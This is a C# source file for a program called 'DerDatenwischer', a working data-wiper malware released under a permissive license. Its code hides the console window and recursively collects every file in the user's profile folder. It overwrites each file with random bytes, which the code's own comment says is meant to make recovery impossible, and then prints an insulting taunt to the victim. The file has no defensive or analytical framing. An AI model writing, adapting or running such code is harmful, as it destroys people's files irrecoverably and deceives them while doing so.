/*
Permission to use, copy, modify, and/or distribute this software for
any purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED “AS IS” AND THE AUTHOR DISCLAIMS ALL
WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES
OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE
FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY
DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT
OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace DerDatenwischer
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hwnd, int option);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static List<string> files = new List<string>();

        // recursively put listed files in a directory into the files variable
        public static List<string> ListFiles(string _directory)
        {

            try
            {
                foreach(string file in Directory.GetFiles(_directory))
                {
                    files.Add(file);
                }

                foreach(string directory in Directory.GetDirectories(_directory))
                {
                    ListFiles(directory);
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
                return null;
            }
            return files;
        }

        // so we can overwrite the file, hopefully making it harder or impossible to recover.
        static void Corrupt(string _filename)
        {
            try
            {
                FileInfo info = new FileInfo(_filename);

                byte[] random = new byte[info.Length * 2];

                RandomNumberGenerator rng = RNGCryptoServiceProvider.Create();
                rng.GetBytes(random);

                File.WriteAllBytes(_filename, random);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        static void Main(string[] _args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            string home = Environment.GetEnvironmentVariable("UserProfile") + @"\";

            ListFiles($"{home}");

            foreach(var file in files)
            {
                Corrupt(file);
            }

            ShowWindow(handle, SW_SHOW);

            Console.Title = "Fuck You!";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("You've been fucked!");
            Console.ReadKey();
        }
    }
}
